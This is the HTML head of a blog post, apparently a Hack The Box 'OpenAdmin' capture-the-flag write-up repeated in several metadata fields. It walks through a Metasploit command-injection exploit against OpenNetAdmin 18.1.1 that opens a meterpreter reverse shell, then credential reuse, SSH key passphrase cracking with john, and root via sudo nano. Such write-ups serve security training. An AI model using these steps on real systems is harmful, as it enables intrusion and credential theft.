@@ -1,0 +1,709 @@
+<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="theme" content="Chirpy v2.7.2"><meta name="generator" content="Jekyll v4.2.0" /><meta property="og:title" content="Hack The Box - OpenAdmin" /><meta name="author" content="rizemon" /><meta property="og:locale" content="en_US" /><meta name="description" content="Configuration The operating systems that I will be using to tackle this machine is a Kali Linux VM. What I learnt from other writeups is that it was a good habit to map a domain name to the machine’s IP address so as that it will be easier to remember. This can done by appending a line to /etc/hosts. 1 $ echo &quot;10.10.10.171 openadmin.htb&quot; &gt;&gt; /etc/hosts Reconnaissance Using nmap, we are able to determine the open ports and running services on the machine. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 $ nmap -sV -sT -sC openadmin.htb tarting Nmap 7.80 ( https://nmap.org ) at 2020-01-10 11:35 EST Nmap scan report for openadmin.htb (10.10.10.171) Host is up (0.46s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA) | 256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA) |_ 256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519) 80/tcp open http? Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 262.61 seconds Enumeration (1) Not much can be done with the ssh service as we do not have any credentials on hand so lets come back to it later. As for the http service, maybe we can find some information on it ? Nothing much here so lets bruteforce some directories using gobuster. 1 2 3 4 5 $ gobuster dir -u http://openadmin.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 100 -k -q ... /music (Status: 301) /artwork (Status: 301) /sierra (Status: 301) There’s a few places to check out but lets take a look at /music first. Mostly static pages but after much “crawling” around, I found /ona by clicking on the “Login” button only on the index page? We are presented with the UI for OpenNetAdmin. 1 OpenNetAdmin provides a database managed inventory of your IP network. Each subnet, host, and IP can be tracked via a centralized AJAX enabled web interface that can help reduce tracking errors. From the UI, we can see that the version of OpenNetAdmin installed on the box is v18.1.1. With that knowledge, I used searchsploit to search for any possible exploit for this version. 1 2 3 4 5 6 7 8 9 10 searchsploit OpenNetAdmin 18.1.1 ----------------------------------------------------------------------------------- ---------------------------------------- Exploit Title | Path | (/usr/share/exploitdb/) ----------------------------------------------------------------------------------- ---------------------------------------- OpenNetAdmin 18.1.1 - Command Injection Exploit (Metasploit) | exploits/php/webapps/47772.rb OpenNetAdmin 18.1.1 - Remote Code Execution | exploits/php/webapps/47691.sh ----------------------------------------------------------------------------------- ---------------------------------------- Shellcodes: No Result Papers: No Result I will be using the Metasploit module for this one. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 $ msfconsole msf5 &gt; search opennetadmin Matching Modules ================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 exploit/unix/webapp/opennetadmin_ping_cmd_injection 2019-11-19 excellent Yes OpenNetAdmin Ping Command Injection msf5 &gt; use exploit/unix/webapp/opennetadmin_ping_cmd_injection msf5 exploit(unix/webapp/opennetadmin_ping_cmd_injection) &gt; set RHOSTS openadmin.htb RHOSTS =&gt; openadmin.htb msf5 exploit(unix/webapp/opennetadmin_ping_cmd_injection) &gt; set LHOST tun0 LHOST =&gt; 10.10.XX.XX msf5 exploit(unix/webapp/opennetadmin_ping_cmd_injection) &gt; run [*] Started reverse TCP handler on 10.10.XX.XX:4444 [*] Exploiting... [*] Command Stager progress - 100.00% done (703/703 bytes) [*] Exploit completed, but no session was created. Hmm no session? Lets use a 64-bit payload instead. 1 2 3 4 5 6 7 8 9 10 11 12 msf5 exploit(unix/webapp/opennetadmin_ping_cmd_injection) &gt; set payload linux/x64/meterpreter/reverse_tcp payload =&gt; linux/x64/meterpreter/reverse_tcp msf5 exploit(unix/webapp/opennetadmin_ping_cmd_injection) &gt; run [*] Started reverse TCP handler on 10.10.XX.XX:4444 [*] Exploiting... [*] Sending stage (3012516 bytes) to 10.10.10.171 [*] Meterpreter session 1 opened (10.10.XX.XX:4444 -&gt; 10.10.10.171:48498) at 2020-04-30 22:45:18 -0400 [*] Command Stager progress - 100.00% done (808/808 bytes) meterpreter &gt; getuid Server username: no-user @ openadmin (uid=33, gid=33, euid=33, egid=33) Alright, we got a foothold! Lets try spawning a tty shell. 1 2 3 4 5 meterpreter &gt; shell which python which python3 python3 -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39; www-data@openadmin:/opt/ona/www$ Seems like we are in the web service’s directory. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 www-data@openadmin:/opt/ona/www$ ls -al -rw-rw-r-- 1 www-data www-data 1970 Jan 3 2018 .htaccess.example drwxrwxr-x 2 www-data www-data 4096 Jan 3 2018 config -rw-rw-r-- 1 www-data www-data 1949 Jan 3 2018 config_dnld.php -rw-rw-r-- 1 www-data www-data 4160 Jan 3 2018 dcm.php drwxrwxr-x 3 www-data www-data 4096 Jan 3 2018 images drwxrwxr-x 9 www-data www-data 4096 Jan 3 2018 include -rw-rw-r-- 1 www-data www-data 1999 Jan 3 2018 index.php drwxrwxr-x 5 www-data www-data 4096 Jan 3 2018 local -rw-rw-r-- 1 www-data www-data 4526 Jan 3 2018 login.php -rw-rw-r-- 1 www-data www-data 1106 Jan 3 2018 logout.php drwxrwxr-x 3 www-data www-data 4096 Jan 3 2018 modules drwxrwxr-x 3 www-data www-data 4096 Jan 3 2018 plugins drwxrwxr-x 2 www-data www-data 4096 Jan 3 2018 winc drwxrwxr-x 3 www-data www-data 4096 Jan 3 2018 workspace_plugins After some digging around, I only found database credentials in /opt/ona/www/local/config/database_settings.inc.php. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 $ /opt/ona/www/local/config/database_settings.inc.php &lt;?php $ona_contexts=array ( &#39;DEFAULT&#39; =&gt; array ( &#39;databases&#39; =&gt; array ( 0 =&gt; array ( &#39;db_type&#39; =&gt; &#39;mysqli&#39;, &#39;db_host&#39; =&gt; &#39;localhost&#39;, &#39;db_login&#39; =&gt; &#39;ona_sys&#39;, &#39;db_passwd&#39; =&gt; &#39;n1nj4W4rri0R!&#39;, &#39;db_database&#39; =&gt; &#39;ona_default&#39;, &#39;db_debug&#39; =&gt; false, ), ), &#39;description&#39; =&gt; &#39;Default data context&#39;, &#39;context_color&#39; =&gt; &#39;#D3DBFF&#39;, ), ); ?&gt; Moving on, I went to check what users were on the box. 1 2 3 4 5 www-data@openadmin:/opt/ona/www$ ls -al /home drwxr-xr-x 4 root root 4096 Nov 22 18:00 . drwxr-xr-x 24 root root 4096 Nov 21 13:41 .. drwxr-x--- 6 jimmy jimmy 4096 May 1 00:44 jimmy drwxr-x--- 6 joanna joanna 4096 May 1 02:43 joanna With these 2 usernames and the password I found, I manually tried each possible combination and managed to log into jimmy. 1 2 3 4 5 $ ssh jimmy@openadmin.htb jimmy@openadmin.htb&#39;s password: n1nj4W4rri0R! ... jimmy@openadmin:~$ id uid=1000(jimmy) gid=1000(jimmy) groups=1000(jimmy),1002(internal) Unfortunately, jimmy doesn’t have the user.txt, which means that joanna has it. It was hard to figure where to go next so I did some basic enumeration and found a very interesting port 52846 that was only exposed on the localhost interface. 1 2 3 4 5 6 7 8 9 10 jimmy@openadmin:~$ netstat -peanut (Not all processes could be identified, non-owned process info will not be shown, you would have to be root to see it all.) Active Internet connections (servers and established) Proto Recv-Q Send-Q Local Address Foreign Address State User Inode PID/Program name tcp 0 0 127.0.0.1:3306 0.0.0.0:* LISTEN 111 20279 - tcp 0 0 127.0.0.1:52846 0.0.0.0:* LISTEN 0 20231 - tcp 0 0 127.0.0.53:53 0.0.0.0:* LISTEN 101 16729 - tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN 0 20036 - ... Lets see if we can scan this port and see what service is running on it. But first, we will need to perform SSH port forwarding to our machine. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 $ ssh -L 1337:localhost:52846 jimmy@openadmin.htb jimmy@openadmin.htb&#39;s password: n1nj4W4rri0R! $ nmap -sV -sT -sC -p 1337 127.0.0.1 Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-01 03:31 EDT Nmap scan report for localhost (127.0.0.1) Host is up (0.000075s latency). PORT STATE SERVICE VERSION 1337/tcp open http Apache httpd 2.4.29 ((Ubuntu)) | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Tutorialspoint.com Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 16.01 seconds There’s a website on that port! Lets try visiting it using our browser. I tried with the credentials I have so far and none of them worked, so I went to check the apache2 configs to see where are the webpages being stored at. 1 2 3 4 5 6 7 jimmy@openadmin:/etc/apache2/sites-available$ ls -al total 24 drwxr-xr-x 2 root root 4096 Nov 23 17:13 . drwxr-xr-x 8 root root 4096 Nov 21 14:08 .. -rw-r--r-- 1 root root 6338 Jul 16 2019 default-ssl.conf -rw-r--r-- 1 root root 303 Nov 23 17:13 internal.conf -rw-r--r-- 1 root root 1329 Nov 22 14:24 openadmin.conf Checking each of the config, we find out that the web pages are at /var/www/internal and we also see some hints of joanna. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 jimmy@openadmin:/etc/apache2/sites-available$ cat internal.conf Listen 127.0.0.1:52846 &lt;VirtualHost 127.0.0.1:52846&gt; ServerName internal.openadmin.htb DocumentRoot /var/www/internal &lt;IfModule mpm_itk_module&gt; AssignUserID joanna joanna &lt;/IfModule&gt; ErrorLog ${APACHE_LOG_DIR}/error.log CustomLog ${APACHE_LOG_DIR}/access.log combined &lt;/VirtualHost&gt; In the directory were 3 files. 1 2 3 4 5 6 7 jimmy@openadmin:/var/www/internal$ ls -al total 20 drwxrwx--- 2 jimmy internal 4096 Nov 23 17:43 . drwxr-xr-x 4 root root 4096 Nov 22 18:15 .. -rwxrwxr-x 1 jimmy internal 3229 Nov 22 23:24 index.php -rwxrwxr-x 1 jimmy internal 185 Nov 23 16:37 logout.php -rwxrwxr-x 1 jimmy internal 339 Nov 23 17:40 main.php In index.php, we find the code used for the login page and the username and password hash were hard-coded in it! 1 2 3 4 5 6 7 8 9 10 11 12 13 jimmy@openadmin:/var/www/internal$ cat index.php &lt;?php $msg = &#39;&#39;; if (isset($_POST[&#39;login&#39;]) &amp;&amp; !empty($_POST[&#39;username&#39;]) &amp;&amp; !empty($_POST[&#39;password&#39;])) { if ($_POST[&#39;username&#39;] == &#39;jimmy&#39; &amp;&amp; hash(&#39;sha512&#39;,$_POST[&#39;password&#39;]) == &#39;00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1&#39;) { $_SESSION[&#39;username&#39;] = &#39;jimmy&#39;; header(&quot;Location: /main.php&quot;); } else { $msg = &#39;Wrong username or password.&#39;; } } ?&gt; If we lookup the hash online, we get “Revealed”. Now, if we enter “jimmy” as the username and “Revealed” as the password, We got in! And we got a SSH private key? Checking the code for main.php(which was the the page we were redirected to), 1 2 3 4 5 6 7 jimmy@openadmin:/var/www/internal$ cat main.php &lt;?php session_start(); if (!isset ($_SESSION[&#39;username&#39;])) { header(&quot;Location: /index.php&quot;); }; # Open Admin Trusted # OpenAdmin $output = shell_exec(&#39;cat /home/joanna/.ssh/id_rsa&#39;); echo &quot;&lt;pre&gt;$output&lt;/pre&gt;&quot;; ?&gt; The private key belongs to user joanna. Lets try sshing using it. 1 2 3 4 $ chmod 700 id_rsa $ ssh -i id_rsa joanna@openadmin.htb Enter passphrase for key &#39;id_rsa&#39;: The private key is protected with a passphrase, so we use ssh2john along with john to crack the passphrase 1 2 3 4 5 6 7 8 9 10 11 12 13 $ python /usr/share/john/ssh2john.py id_rsa &gt; joanna.hash $ john --wordlist=/usr/share/wordlists/rockyou.txt joanna.hash Using default input encoding: UTF-8 Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64]) Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes Cost 2 (iteration count) is 1 for all loaded hashes Will run 6 OpenMP threads Note: This format may emit false positives, so it will keep trying even after finding a possible candidate. Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status bloodninjas (id_rsa) 1g 0:00:00:05 DONE (2020-05-01 05:12) 0.1858g/s 2665Kp/s 2665Kc/s 2665KC/s 1990..*7¡Vamos! Session completed user.txt Now, we can finally get our user.txt. 1 2 3 4 5 $ ssh -i id_rsa joanna@openadmin.htb Enter passphrase for key &#39;id_rsa&#39;: bloodninjas ... joanna@openadmin:~$ cat user.txt c9b2XXXXXXXXXXXXXXXXXXXXXXXXXXXX Enumeration (2) If we list the commands we can run sudo with, 1 2 3 4 5 6 joanna@openadmin:~$ sudo -l Matching Defaults entries for joanna on openadmin: env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin User joanna may run the following commands on openadmin: (ALL) NOPASSWD: /bin/nano /opt/priv root.txt joanna can run nano as root! And according to GTFOBins, we can spawn a shell as root. Creating /opt/priv and running nano using sudo on /opt/priv: 1 2 joanna@openadmin:~$ touch /opt/priv joanna@openadmin:~$ sudo /bin/nano /opt/priv Doing Ctrl+R and Ctrl+X: Executing the magical string and getting the flag: Rooted ! Thank you for reading and look forward for more writeups and articles !" /><meta property="og:description" content="Configuration The operating systems that I will be using to tackle this machine is a Kali Linux VM. What I learnt from other writeups is that it was a good habit to map a domain name to the machine’s IP address so as that it will be easier to remember. This can done by appending a line to /etc/hosts. 1 $ echo &quot;10.10.10.171 openadmin.htb&quot; &gt;&gt; /etc/hosts Reconnaissance Using nmap, we are able to determine the open ports and running services on the machine. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 $ nmap -sV -sT -sC openadmin.htb tarting Nmap 7.80 ( https://nmap.org ) at 2020-01-10 11:35 EST Nmap scan report for openadmin.htb (10.10.10.171) Host is up (0.46s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA) | 256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA) |_ 256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519) 80/tcp open http? Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 262.61 seconds Enumeration (1) Not much can be done with the ssh service as we do not have any credentials on hand so lets come back to it later. As for the http service, maybe we can find some information on it ? Nothing much here so lets bruteforce some directories using gobuster. 1 2 3 4 5 $ gobuster dir -u http://openadmin.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 100 -k -q ... /music (Status: 301) /artwork (Status: 301) /sierra (Status: 301) There’s a few places to check out but lets take a look at /music first. Mostly static pages but after much “crawling” around, I found /ona by clicking on the “Login” button only on the index page? We are presented with the UI for OpenNetAdmin. 1 OpenNetAdmin provides a database managed inventory of your IP network. Each subnet, host, and IP can be tracked via a centralized AJAX enabled web interface that can help reduce tracking errors. From the UI, we can see that the version of OpenNetAdmin installed on the box is v18.1.1. With that knowledge, I used searchsploit to search for any possible exploit for this version. 1 2 3 4 5 6 7 8 9 10 searchsploit OpenNetAdmin 18.1.1 ----------------------------------------------------------------------------------- ---------------------------------------- Exploit Title | Path | (/usr/share/exploitdb/) ----------------------------------------------------------------------------------- ---------------------------------------- OpenNetAdmin 18.1.1 - Command Injection Exploit (Metasploit) | exploits/php/webapps/47772.rb OpenNetAdmin 18.1.1 - Remote Code Execution | exploits/php/webapps/47691.sh ----------------------------------------------------------------------------------- ---------------------------------------- Shellcodes: No Result Papers: No Result I will be using the Metasploit module for this one. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 $ msfconsole msf5 &gt; search opennetadmin Matching Modules ================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 exploit/unix/webapp/opennetadmin_ping_cmd_injection 2019-11-19 excellent Yes OpenNetAdmin Ping Command Injection msf5 &gt; use exploit/unix/webapp/opennetadmin_ping_cmd_injection msf5 exploit(unix/webapp/opennetadmin_ping_cmd_injection) &gt; set RHOSTS openadmin.htb RHOSTS =&gt; openadmin.htb msf5 exploit(unix/webapp/opennetadmin_ping_cmd_injection) &gt; set LHOST tun0 LHOST =&gt; 10.10.XX.XX msf5 exploit(unix/webapp/opennetadmin_ping_cmd_injection) &gt; run [*] Started reverse TCP handler on 10.10.XX.XX:4444 [*] Exploiting... [*] Command Stager progress - 100.00% done (703/703 bytes) [*] Exploit completed, but no session was created. Hmm no session? Lets use a 64-bit payload instead. 1 2 3 4 5 6 7 8 9 10 11 12 msf5 exploit(unix/webapp/opennetadmin_ping_cmd_injection) &gt; set payload linux/x64/meterpreter/reverse_tcp payload =&gt; linux/x64/meterpreter/reverse_tcp msf5 exploit(unix/webapp/opennetadmin_ping_cmd_injection) &gt; run [*] Started reverse TCP handler on 10.10.XX.XX:4444 [*] Exploiting... [*] Sending stage (3012516 bytes) to 10.10.10.171 [*] Meterpreter session 1 opened (10.10.XX.XX:4444 -&gt; 10.10.10.171:48498) at 2020-04-30 22:45:18 -0400 [*] Command Stager progress - 100.00% done (808/808 bytes) meterpreter &gt; getuid Server username: no-user @ openadmin (uid=33, gid=33, euid=33, egid=33) Alright, we got a foothold! Lets try spawning a tty shell. 1 2 3 4 5 meterpreter &gt; shell which python which python3 python3 -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39; www-data@openadmin:/opt/ona/www$ Seems like we are in the web service’s directory. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 www-data@openadmin:/opt/ona/www$ ls -al -rw-rw-r-- 1 www-data www-data 1970 Jan 3 2018 .htaccess.example drwxrwxr-x 2 www-data www-data 4096 Jan 3 2018 config -rw-rw-r-- 1 www-data www-data 1949 Jan 3 2018 config_dnld.php -rw-rw-r-- 1 www-data www-data 4160 Jan 3 2018 dcm.php drwxrwxr-x 3 www-data www-data 4096 Jan 3 2018 images drwxrwxr-x 9 www-data www-data 4096 Jan 3 2018 include -rw-rw-r-- 1 www-data www-data 1999 Jan 3 2018 index.php drwxrwxr-x 5 www-data www-data 4096 Jan 3 2018 local -rw-rw-r-- 1 www-data www-data 4526 Jan 3 2018 login.php -rw-rw-r-- 1 www-data www-data 1106 Jan 3 2018 logout.php drwxrwxr-x 3 www-data www-data 4096 Jan 3 2018 modules drwxrwxr-x 3 www-data www-data 4096 Jan 3 2018 plugins drwxrwxr-x 2 www-data www-data 4096 Jan 3 2018 winc drwxrwxr-x 3 www-data www-data 4096 Jan 3 2018 workspace_plugins After some digging around, I only found database credentials in /opt/ona/www/local/config/database_settings.inc.php. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 $ /opt/ona/www/local/config/database_settings.inc.php &lt;?php $ona_contexts=array ( &#39;DEFAULT&#39; =&gt; array ( &#39;databases&#39; =&gt; array ( 0 =&gt; array ( &#39;db_type&#39; =&gt; &#39;mysqli&#39;, &#39;db_host&#39; =&gt; &#39;localhost&#39;, &#39;db_login&#39; =&gt; &#39;ona_sys&#39;, &#39;db_passwd&#39; =&gt; &#39;n1nj4W4rri0R!&#39;, &#39;db_database&#39; =&gt; &#39;ona_default&#39;, &#39;db_debug&#39; =&gt; false, ), ), &#39;description&#39; =&gt; &#39;Default data context&#39;, &#39;context_color&#39; =&gt; &#39;#D3DBFF&#39;, ), ); ?&gt; Moving on, I went to check what users were on the box. 1 2 3 4 5 www-data@openadmin:/opt/ona/www$ ls -al /home drwxr-xr-x 4 root root 4096 Nov 22 18:00 . drwxr-xr-x 24 root root 4096 Nov 21 13:41 .. drwxr-x--- 6 jimmy jimmy 4096 May 1 00:44 jimmy drwxr-x--- 6 joanna joanna 4096 May 1 02:43 joanna With these 2 usernames and the password I found, I manually tried each possible combination and managed to log into jimmy. 1 2 3 4 5 $ ssh jimmy@openadmin.htb jimmy@openadmin.htb&#39;s password: n1nj4W4rri0R! ... jimmy@openadmin:~$ id uid=1000(jimmy) gid=1000(jimmy) groups=1000(jimmy),1002(internal) Unfortunately, jimmy doesn’t have the user.txt, which means that joanna has it. It was hard to figure where to go next so I did some basic enumeration and found a very interesting port 52846 that was only exposed on the localhost interface. 1 2 3 4 5 6 7 8 9 10 jimmy@openadmin:~$ netstat -peanut (Not all processes could be identified, non-owned process info will not be shown, you would have to be root to see it all.) Active Internet connections (servers and established) Proto Recv-Q Send-Q Local Address Foreign Address State User Inode PID/Program name tcp 0 0 127.0.0.1:3306 0.0.0.0:* LISTEN 111 20279 - tcp 0 0 127.0.0.1:52846 0.0.0.0:* LISTEN 0 20231 - tcp 0 0 127.0.0.53:53 0.0.0.0:* LISTEN 101 16729 - tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN 0 20036 - ... Lets see if we can scan this port and see what service is running on it. But first, we will need to perform SSH port forwarding to our machine. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 $ ssh -L 1337:localhost:52846 jimmy@openadmin.htb jimmy@openadmin.htb&#39;s password: n1nj4W4rri0R! $ nmap -sV -sT -sC -p 1337 127.0.0.1 Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-01 03:31 EDT Nmap scan report for localhost (127.0.0.1) Host is up (0.000075s latency). PORT STATE SERVICE VERSION 1337/tcp open http Apache httpd 2.4.29 ((Ubuntu)) | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Tutorialspoint.com Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 16.01 seconds There’s a website on that port! Lets try visiting it using our browser. I tried with the credentials I have so far and none of them worked, so I went to check the apache2 configs to see where are the webpages being stored at. 1 2 3 4 5 6 7 jimmy@openadmin:/etc/apache2/sites-available$ ls -al total 24 drwxr-xr-x 2 root root 4096 Nov 23 17:13 . drwxr-xr-x 8 root root 4096 Nov 21 14:08 .. -rw-r--r-- 1 root root 6338 Jul 16 2019 default-ssl.conf -rw-r--r-- 1 root root 303 Nov 23 17:13 internal.conf -rw-r--r-- 1 root root 1329 Nov 22 14:24 openadmin.conf Checking each of the config, we find out that the web pages are at /var/www/internal and we also see some hints of joanna. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 jimmy@openadmin:/etc/apache2/sites-available$ cat internal.conf Listen 127.0.0.1:52846 &lt;VirtualHost 127.0.0.1:52846&gt; ServerName internal.openadmin.htb DocumentRoot /var/www/internal &lt;IfModule mpm_itk_module&gt; AssignUserID joanna joanna &lt;/IfModule&gt; ErrorLog ${APACHE_LOG_DIR}/error.log CustomLog ${APACHE_LOG_DIR}/access.log combined &lt;/VirtualHost&gt; In the directory were 3 files. 1 2 3 4 5 6 7 jimmy@openadmin:/var/www/internal$ ls -al total 20 drwxrwx--- 2 jimmy internal 4096 Nov 23 17:43 . drwxr-xr-x 4 root root 4096 Nov 22 18:15 .. -rwxrwxr-x 1 jimmy internal 3229 Nov 22 23:24 index.php -rwxrwxr-x 1 jimmy internal 185 Nov 23 16:37 logout.php -rwxrwxr-x 1 jimmy internal 339 Nov 23 17:40 main.php In index.php, we find the code used for the login page and the username and password hash were hard-coded in it! 1 2 3 4 5 6 7 8 9 10 11 12 13 jimmy@openadmin:/var/www/internal$ cat index.php &lt;?php $msg = &#39;&#39;; if (isset($_POST[&#39;login&#39;]) &amp;&amp; !empty($_POST[&#39;username&#39;]) &amp;&amp; !empty($_POST[&#39;password&#39;])) { if ($_POST[&#39;username&#39;] == &#39;jimmy&#39; &amp;&amp; hash(&#39;sha512&#39;,$_POST[&#39;password&#39;]) == &#39;00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1&#39;) { $_SESSION[&#39;username&#39;] = &#39;jimmy&#39;; header(&quot;Location: /main.php&quot;); } else { $msg = &#39;Wrong username or password.&#39;; } } ?&gt; If we lookup the hash online, we get “Revealed”. Now, if we enter “jimmy” as the username and “Revealed” as the password, We got in! And we got a SSH private key? Checking the code for main.php(which was the the page we were redirected to), 1 2 3 4 5 6 7 jimmy@openadmin:/var/www/internal$ cat main.php &lt;?php session_start(); if (!isset ($_SESSION[&#39;username&#39;])) { header(&quot;Location: /index.php&quot;); }; # Open Admin Trusted # OpenAdmin $output = shell_exec(&#39;cat /home/joanna/.ssh/id_rsa&#39;); echo &quot;&lt;pre&gt;$output&lt;/pre&gt;&quot;; ?&gt; The private key belongs to user joanna. Lets try sshing using it. 1 2 3 4 $ chmod 700 id_rsa $ ssh -i id_rsa joanna@openadmin.htb Enter passphrase for key &#39;id_rsa&#39;: The private key is protected with a passphrase, so we use ssh2john along with john to crack the passphrase 1 2 3 4 5 6 7 8 9 10 11 12 13 $ python /usr/share/john/ssh2john.py id_rsa &gt; joanna.hash $ john --wordlist=/usr/share/wordlists/rockyou.txt joanna.hash Using default input encoding: UTF-8 Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64]) Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes Cost 2 (iteration count) is 1 for all loaded hashes Will run 6 OpenMP threads Note: This format may emit false positives, so it will keep trying even after finding a possible candidate. Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status bloodninjas (id_rsa) 1g 0:00:00:05 DONE (2020-05-01 05:12) 0.1858g/s 2665Kp/s 2665Kc/s 2665KC/s 1990..*7¡Vamos! Session completed user.txt Now, we can finally get our user.txt. 1 2 3 4 5 $ ssh -i id_rsa joanna@openadmin.htb Enter passphrase for key &#39;id_rsa&#39;: bloodninjas ... joanna@openadmin:~$ cat user.txt c9b2XXXXXXXXXXXXXXXXXXXXXXXXXXXX Enumeration (2) If we list the commands we can run sudo with, 1 2 3 4 5 6 joanna@openadmin:~$ sudo -l Matching Defaults entries for joanna on openadmin: env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin User joanna may run the following commands on openadmin: (ALL) NOPASSWD: /bin/nano /opt/priv root.txt joanna can run nano as root! And according to GTFOBins, we can spawn a shell as root. Creating /opt/priv and running nano using sudo on /opt/priv: 1 2 joanna@openadmin:~$ touch /opt/priv joanna@openadmin:~$ sudo /bin/nano /opt/priv Doing Ctrl+R and Ctrl+X: Executing the magical string and getting the flag: Rooted ! Thank you for reading and look forward for more writeups and articles !" /><link rel="canonical" href="https://rizemon.github.io/posts/openadmin-htb/" /><meta property="og:url" content="https://rizemon.github.io/posts/openadmin-htb/" /><meta property="og:site_name" content="rizemon’s blog" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2020-05-03T10:27:00+08:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Hack The Box - OpenAdmin" /><meta name="twitter:site" content="@rizemon" /><meta name="twitter:creator" content="@rizemon" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"author":{"@type":"Person","name":"rizemon"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://rizemon.github.io/posts/openadmin-htb/"},"description":"Configuration The operating systems that I will be using to tackle this machine is a Kali Linux VM. What I learnt from other writeups is that it was a good habit to map a domain name to the machine’s IP address so as that it will be easier to remember. This can done by appending a line to /etc/hosts. 1 $ echo &quot;10.10.10.171 openadmin.htb&quot; &gt;&gt; /etc/hosts Reconnaissance Using nmap, we are able to determine the open ports and running services on the machine. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 $ nmap -sV -sT -sC openadmin.htb tarting Nmap 7.80 ( https://nmap.org ) at 2020-01-10 11:35 EST Nmap scan report for openadmin.htb (10.10.10.171) Host is up (0.46s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA) | 256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA) |_ 256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519) 80/tcp open http? Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 262.61 seconds Enumeration (1) Not much can be done with the ssh service as we do not have any credentials on hand so lets come back to it later. As for the http service, maybe we can find some information on it ? Nothing much here so lets bruteforce some directories using gobuster. 1 2 3 4 5 $ gobuster dir -u http://openadmin.htb -w 